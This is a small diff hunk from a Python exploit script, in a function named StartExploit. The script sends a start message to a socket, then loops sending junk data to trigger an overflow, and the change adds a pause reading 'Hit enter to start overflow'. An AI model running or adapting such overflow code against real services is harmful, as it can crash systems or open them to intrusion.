@@ -16,6 +16,7 @@ def StartExploit():
 	c.send(start)
 	print(c.recv(65535))
 	count = 0
+	raw_input("Hit enter to start overflow")
 	while 1:
 		c.send(junk)
 		count += 999999999
